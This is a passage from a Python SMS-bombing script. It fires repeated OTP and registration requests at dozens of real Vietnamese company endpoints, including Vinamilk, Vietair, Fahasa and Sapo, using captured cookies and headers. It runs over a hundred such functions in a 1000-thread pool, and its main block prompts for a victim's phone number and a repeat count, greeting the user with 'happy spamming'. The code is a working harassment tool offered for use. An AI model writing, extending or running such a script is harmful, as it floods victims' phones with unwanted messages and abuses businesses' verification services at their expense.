    '_ga_6NH1HJ4MRS': 'GS1.1.1721111594.2.1.1721111671.44.0.0',
    '_clsk': '1q6ggsm%7C1721111672278%7C4%7C1%7Cv.clarity.ms%2Fcollect',
}

    headers = {
    'accept': '*/*',
    'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'authorization': 'Bearer null',
    'cache-control': 'no-cache',
    'content-type': 'text/plain;charset=UTF-8',
    # 'cookie': '_gcl_au=1.1.998139933.1720624574; _ga=GA1.1.50287730.1720624578; _fbp=fb.2.1720624579398.521085014509551541; _tt_enable_cookie=1; _ttp=KSqjH4dgnlCZCXFrW8iH9-PBbVv; _gcl_gs=2.1.k1$i1720624593; _gcl_aw=GCL.1720624597.CjwKCAjw4ri0BhAvEiwA8oo6F2TkUVdatYI4tVOobGswn40OdeGgXIg6LXx5FNTWp7uUoRTyudcm1hoCI04QAvD_BwE; _hjSessionUser_2067180=eyJpZCI6IjdhM2IwZGI1LTAyYzUtNTk0YS1hYWIxLTUxNGFhMjEzYmMwNyIsImNyZWF0ZWQiOjE3MjA2MjQ1Nzk1NjAsImV4aXN0aW5nIjp0cnVlfQ==; ci_session=a%3A5%3A%7Bs%3A10%3A%22session_id%22%3Bs%3A32%3A%223d8858bedb9f88174683e7216ae7f4de%22%3Bs%3A10%3A%22ip_address%22%3Bs%3A11%3A%22172.20.10.5%22%3Bs%3A10%3A%22user_agent%22%3Bs%3A111%3A%22Mozilla%2F5.0+%28Windows+NT+10.0%3B+Win64%3B+x64%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F126.0.0.0+Safari%2F537.36%22%3Bs%3A13%3A%22last_activity%22%3Bi%3A1721111592%3Bs%3A9%3A%22user_data%22%3Bs%3A0%3A%22%22%3B%7D5be85c0c1450958dd4ed204579b830aa; _hjSession_2067180=eyJpZCI6IjJiMDkwNzRmLTA2M2YtNDNkOC1hYzljLTk1ZTM4MDU3ODA5NSIsImMiOjE3MjExMTE1OTU0NzgsInMiOjAsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjowLCJzcCI6MX0=; _clck=1sxln5m%7C2%7Cfni%7C0%7C1652; __cf_bm=lBreB9n2Kjxr5GDN12Z6cP1PU2TCNww1w8ccXp5bzus-1721111653-1.0.1.1-tG3rISwY9rhAXjyBqH8rYZTCWOA9POhBSf1D0X0bFyRdMUnR9K7cmCgu05Xxiho3.bxM00TNCyc6lQ8OcpEhcA; builderSessionId=7b564e5635c64aa4b60d611b650e05b4; sca_fg_codes=[]; avadaIsLogin=; _ga_6NH1HJ4MRS=GS1.1.1721111594.2.1.1721111671.44.0.0; _clsk=1q6ggsm%7C1721111672278%7C4%7C1%7Cv.clarity.ms%2Fcollect',
    'origin': 'https://new.vinamilk.com.vn',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://new.vinamilk.com.vn/account/register',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
}

    data = '{"type":"register","phone":"' + phone + '"}'

    response = requests.post('https://new.vinamilk.com.vn/api/account/getotp', cookies=cookies, headers=headers, data=data)
def air(phone):
    referer_url = f'https://vietair.com.vn/khach-hang-than-quen/xac-nhan-otp-dang-ky?sq_id=30149&mobile={phone}'

    cookies = {
        '_gcl_au': '1.1.515899722.1720625176',
        '_tt_enable_cookie': '1',
        '_ttp': 't-FL-whNfDCNGHd27aF7syOqRSh',
        '_fbp': 'fb.2.1720625180842.882992170348492798',
        '__zi': '3000.SSZzejyD3jSkdkgYo5SCqJ6U_wE7LLZFVv3duDj7Kj1jqlNsoWH8boBGzBYF0KELBTUwk8y31v8gtBUuYWuBa0.1',
        '_gid': 'GA1.3.1511312052.1721112193',
        '_clck': '1eg7brl%7C2%7Cfni%7C0%7C1652',
        '_ga': 'GA1.1.186819165.1720625180',
        '_ga_R4WM78RL0C': 'GS1.1.1721112192.2.1.1721112216.36.0.0',
    }

    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'cache-control': 'no-cache',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://vietair.com.vn',
        'pragma': 'no-cache',
        'priority': 'u=1, i',
        'referer': referer_url,
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'op': 'PACKAGE_HTTP_POST',
        'path_ajax_post': '/service03/sms/get',
        'package_name': 'PK_FD_SMS_OTP',
        'object_name': 'INS',
        'P_MOBILE': phone,
        'P_TYPE_ACTIVE_CODE': 'DANG_KY_NHAN_OTP',
    }

    response = requests.post('https://vietair.com.vn/Handler/CoreHandler.ashx', cookies=cookies, headers=headers, data=data)
def fa(phone):
    cookies = {
    'frontend': '2c83545216a746a78e9359eb6ed27b3d',
    '_ga': 'GA1.1.4630769.1721136088',
    '_gcl_au': '1.1.1971610675.1721136089',
    'frontend_cid': 'zNYnI9BV3h9Li12T',
    '_tt_enable_cookie': '1',
    '_ttp': 'yK0_Sao-5lepXIRR39-6N_UcfI2',
    '_fbp': 'fb.1.1721136099403.449285731186677163',
    '_clck': '1n4uxir%7C2%7Cfni%7C0%7C1658',
    'moe_uuid': '3aa3f66c-847f-4fcc-988c-f4d857f0a073',
    'USER_DATA': '%7B%22attributes%22%3A%5B%5D%2C%22subscribedToOldSdk%22%3Afalse%2C%22deviceUuid%22%3A%223aa3f66c-847f-4fcc-988c-f4d857f0a073%22%2C%22deviceAdded%22%3Atrue%7D',
    'SOFT_ASK_STATUS': '%7B%22actualValue%22%3A%22not%20shown%22%2C%22MOE_DATA_TYPE%22%3A%22string%22%7D',
    'OPT_IN_SHOWN_TIME': '1721136125365',
    'HARD_ASK_STATUS': '%7B%22actualValue%22%3A%22dismissed%22%2C%22MOE_DATA_TYPE%22%3A%22string%22%7D',
    '_clsk': '169oz62%7C1721136183839%7C3%7C1%7Cv.clarity.ms%2Fcollect',
    'SESSION': '%7B%22sessionKey%22%3A%223579222f-fe73-4c43-93d9-21152f0de1a8%22%2C%22sessionStartTime%22%3A%222024-07-16T13%3A21%3A45.728Z%22%2C%22sessionMaxTime%22%3A1800%2C%22customIdentifiersToTrack%22%3A%5B%5D%2C%22sessionExpiryTime%22%3A1721137985887%2C%22numberOfSessions%22%3A1%7D',
    '_ga_460L9JMC2G': 'GS1.1.1721136088.1.1.1721136245.60.0.1919128255',
}

    headers = {
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': 'frontend=2c83545216a746a78e9359eb6ed27b3d; _ga=GA1.1.4630769.1721136088; _gcl_au=1.1.1971610675.1721136089; frontend_cid=zNYnI9BV3h9Li12T; _tt_enable_cookie=1; _ttp=yK0_Sao-5lepXIRR39-6N_UcfI2; _fbp=fb.1.1721136099403.449285731186677163; _clck=1n4uxir%7C2%7Cfni%7C0%7C1658; moe_uuid=3aa3f66c-847f-4fcc-988c-f4d857f0a073; USER_DATA=%7B%22attributes%22%3A%5B%5D%2C%22subscribedToOldSdk%22%3Afalse%2C%22deviceUuid%22%3A%223aa3f66c-847f-4fcc-988c-f4d857f0a073%22%2C%22deviceAdded%22%3Atrue%7D; SOFT_ASK_STATUS=%7B%22actualValue%22%3A%22not%20shown%22%2C%22MOE_DATA_TYPE%22%3A%22string%22%7D; OPT_IN_SHOWN_TIME=1721136125365; HARD_ASK_STATUS=%7B%22actualValue%22%3A%22dismissed%22%2C%22MOE_DATA_TYPE%22%3A%22string%22%7D; _clsk=169oz62%7C1721136183839%7C3%7C1%7Cv.clarity.ms%2Fcollect; SESSION=%7B%22sessionKey%22%3A%223579222f-fe73-4c43-93d9-21152f0de1a8%22%2C%22sessionStartTime%22%3A%222024-07-16T13%3A21%3A45.728Z%22%2C%22sessionMaxTime%22%3A1800%2C%22customIdentifiersToTrack%22%3A%5B%5D%2C%22sessionExpiryTime%22%3A1721137985887%2C%22numberOfSessions%22%3A1%7D; _ga_460L9JMC2G=GS1.1.1721136088.1.1.1721136245.60.0.1919128255',
    'origin': 'https://www.fahasa.com',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://www.fahasa.com/customer/account/login/referer/aHR0cHM6Ly93d3cuZmFoYXNhLmNvbS9jdXN0b21lci9hY2NvdW50L2luZGV4Lw,,/',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'traceparent': '00-13c9c10c4d525aad8d0528fa3b7fd940-866a99283e198658-01',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}

    data = {
    'phone': phone,
}

    response = requests.post('https://www.fahasa.com/ajaxlogin/ajax/checkPhone', cookies=cookies, headers=headers, data=data)
def sapo(phone):
    cookies = {
    '_hjSessionUser_3167213': 'eyJpZCI6IjZlZWEzMDY1LTI2ZTctNTg4OC1hY2YyLTBmODQwYmY4OGYyMyIsImNyZWF0ZWQiOjE3MjExMzYxMDU4NDIsImV4aXN0aW5nIjp0cnVlfQ==',
    '_hjSession_3167213': 'eyJpZCI6IjMxN2QxMGYwLTE1ZDEtNDA3Yi1iM2YwLWY2YzQyNGYwOGZkYSIsImMiOjE3MjExMzYxMDU4NDUsInMiOjEsInIiOjEsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjoxLCJzcCI6MH0=',
    '_gid': 'GA1.2.312311746.1721136107',
    '_fbp': 'fb.1.1721136112829.278874665245209803',
    '_ce.irv': 'new',
    'cebs': '1',
    '_ce.clock_event': '1',
    '_ce.clock_data': '-24%2C1.54.177.179%2C1%2Cf1f6b29a6cc1f79a0fea05b885aa33d0%2CChrome%2CVN',
    'G_ENABLED_IDPS': 'google',
    'source': 'https://www.sapo.vn/dang-nhap-kenh-ban-hang.html',
    'lang': 'vi',
    'referral': 'https://accounts.sapo.vn/',
    'landing_page': 'https://www.sapo.vn/dang-nhap-kenh-ban-hang.html',
    'start_time': '07/16/2024 20:50:23',
    '_dc_gtm_UA-66880228-3': '1',
    'pageview': '2',
    '_ga_4NX0F91DEX': 'GS1.2.1721136112.1.1.1721137827.0.0.0',
    'cebsp_': '8',
    '_dc_gtm_UA-66880228-1': '1',
    '_gat_UA-239546923-1': '1',
    '_ga_YNVPPJ8MZP': 'GS1.1.1721136164.1.1.1721137832.50.0.0',
    '_ga': 'GA1.1.1203051188.1721136107',
    '_ga_GECRBQV6JK': 'GS1.1.1721136164.1.1.1721137833.49.0.0',
    '_ga_8956TVT2M3': 'GS1.1.1721136165.1.1.1721137833.49.0.0',
    '_ga_HXMGB9WRVX': 'GS1.1.1721136159.1.1.1721137833.60.0.0',
    '_ga_CDD1S5P7D4': 'GS1.1.1721136165.1.1.1721137833.49.0.0',
    '_ga_Y9YZPDEGP0': 'GS1.1.1721136163.1.1.1721137833.49.0.0',
    '_ga_EBZKH8C7MK': 'GS1.2.1721136166.1.1.1721137833.0.0.0',
    '_ga_P9DPF3E00F': 'GS1.1.1721136112.1.1.1721137846.0.0.0',
    '_ga_8Z6MB85ZM2': 'GS1.1.1721136165.1.1.1721137847.35.0.0',
    '_ce.s': 'v~a9bf0cd0d29c960e5bff8890efefc88e208d7385~lcw~1721137874051~lva~1721136168617~vpv~0~v11.fhb~1721136169125~v11.lhb~1721137827515~v11.cs~200798~v11.s~7f389030-4376-11ef-8b30-7911946dbf22~v11.sla~1721137874457~lcw~1721137874457',
    '_gcl_au': '1.1.1947486191.1721136104.1373278243.1721136556.1721137874',
}

    headers = {
    'accept': '*/*',
    'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': '_hjSessionUser_3167213=eyJpZCI6IjZlZWEzMDY1LTI2ZTctNTg4OC1hY2YyLTBmODQwYmY4OGYyMyIsImNyZWF0ZWQiOjE3MjExMzYxMDU4NDIsImV4aXN0aW5nIjp0cnVlfQ==; _hjSession_3167213=eyJpZCI6IjMxN2QxMGYwLTE1ZDEtNDA3Yi1iM2YwLWY2YzQyNGYwOGZkYSIsImMiOjE3MjExMzYxMDU4NDUsInMiOjEsInIiOjEsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjoxLCJzcCI6MH0=; _gid=GA1.2.312311746.1721136107; _fbp=fb.1.1721136112829.278874665245209803; _ce.irv=new; cebs=1; _ce.clock_event=1; _ce.clock_data=-24%2C1.54.177.179%2C1%2Cf1f6b29a6cc1f79a0fea05b885aa33d0%2CChrome%2CVN; G_ENABLED_IDPS=google; source=https://www.sapo.vn/dang-nhap-kenh-ban-hang.html; lang=vi; referral=https://accounts.sapo.vn/; landing_page=https://www.sapo.vn/dang-nhap-kenh-ban-hang.html; start_time=07/16/2024 20:50:23; _dc_gtm_UA-66880228-3=1; pageview=2; _ga_4NX0F91DEX=GS1.2.1721136112.1.1.1721137827.0.0.0; cebsp_=8; _dc_gtm_UA-66880228-1=1; _gat_UA-239546923-1=1; _ga_YNVPPJ8MZP=GS1.1.1721136164.1.1.1721137832.50.0.0; _ga=GA1.1.1203051188.1721136107; _ga_GECRBQV6JK=GS1.1.1721136164.1.1.1721137833.49.0.0; _ga_8956TVT2M3=GS1.1.1721136165.1.1.1721137833.49.0.0; _ga_HXMGB9WRVX=GS1.1.1721136159.1.1.1721137833.60.0.0; _ga_CDD1S5P7D4=GS1.1.1721136165.1.1.1721137833.49.0.0; _ga_Y9YZPDEGP0=GS1.1.1721136163.1.1.1721137833.49.0.0; _ga_EBZKH8C7MK=GS1.2.1721136166.1.1.1721137833.0.0.0; _ga_P9DPF3E00F=GS1.1.1721136112.1.1.1721137846.0.0.0; _ga_8Z6MB85ZM2=GS1.1.1721136165.1.1.1721137847.35.0.0; _ce.s=v~a9bf0cd0d29c960e5bff8890efefc88e208d7385~lcw~1721137874051~lva~1721136168617~vpv~0~v11.fhb~1721136169125~v11.lhb~1721137827515~v11.cs~200798~v11.s~7f389030-4376-11ef-8b30-7911946dbf22~v11.sla~1721137874457~lcw~1721137874457; _gcl_au=1.1.1947486191.1721136104.1373278243.1721136556.1721137874',
    'origin': 'https://www.sapo.vn',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://www.sapo.vn/dang-nhap-kenh-ban-hang.html',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
}

    data = {
    'phonenumber': phone,
}

    response = requests.post('https://www.sapo.vn/fnb/sendotp', cookies=cookies, headers=headers, data=data)
def run(phone, i):
    functions = [
        tv360, robot, fb, mocha, dvcd, myvt, phar, dkimu, fptshop, meta, blu, tgdt, concung, money, sapo, hoang, winmart, alf, guma, kingz, acfc, 
        phuc, medi, emart, hana, med, ghn, shop, gala, fa, cathay, vina, ahamove, air, otpmu, vtpost, shine, domi, fm, cir, hoanvu, tokyo,
        shop, beau, fu, lote, lon, giathuoctot, mainguyen, vinwonder, tatcorp, book365, psc, acheckin, tiniworld, ghnexp, circa, bds, mio, aji, lie, rich, vinpearl,
        bestinc, fptplay, mego, chotot, tv360, robot, fb, mocha, dvcd, myvt, phar, dkimu, fptshop, meta, blu, one, tgdt, concung, money, sapo, hoang,
        winmart, alf, guma, kingz, acfc, phuc, medi, emart, hana, med, ghn, shop, sms3, gala, fa, vina, ahamove, air, otpmu, vtpost, shine,
        domi, fm, cir, hoanvu, tokyo, shop, beau, fu, lote, lon,  giathuoctot, mainguyen, vinwonder, tatcorp, book365, psc, acheckin, tiniworld, ghnexp, circa, bds, 
        mio, aji, lie, rich, vinpearl, bestinc, fptplay, mego
    ]

    with concurrent.futures.ThreadPoolExecutor(max_workers=1000) as executor:
        futures = [executor.submit(fn, phone) for fn in functions]
        for future in concurrent.futures.as_completed(futures):
            try:
                future.result()
            except Exception as exc:
                print(f'Generated an exception: {exc}')

    print("\033[1;32mSpam Thành Công Lần:\033[1;37m", i)
    for j in range(1, 0, -1):
        print(f"\033[1;93mVui Lòng Chờ \033[1;37m{j}\033[1;93m giây", end="\r")
        time.sleep(1)

if __name__ == "__main__":
    print(f"""
    Chúc Bạn Spam Vui Vẻ !""")
    phone = input("\033[1;93mNHẬP SĐT CẦN SPAM:\033[1;37m ")
    while not re.search("^(0?)(3[2-9]|5[6|8|9]|7[0|6-9]|8[0-6|8|9]|9[0-4|6-9])[0-9]{7}$",phone):
          print('sdt dưới 10 số bạn ơii ')
          exit()
    count = int(input("\033[1;93mNHẬP SỐ LẦN SPAM:\033[1;37m "))
    
    for i in range(1, count + 1):
        run(phone, i)